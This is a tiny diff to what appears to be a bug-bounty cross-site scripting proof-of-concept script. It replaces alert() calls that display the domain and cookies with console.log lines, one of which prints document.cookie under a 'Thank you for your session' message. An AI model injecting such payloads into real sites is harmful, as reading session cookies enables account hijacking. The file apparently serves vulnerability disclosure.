@@ -1,3 +1,2 @@
-alert('XSS weep2609 - Bug Bounty');//
-alert(document.domain);//
-alert(document.cookie);//
+console.log('POC by weep2609 - Bug Bounty');//
+console.log("Thank you for your session: " + document.cookie);//
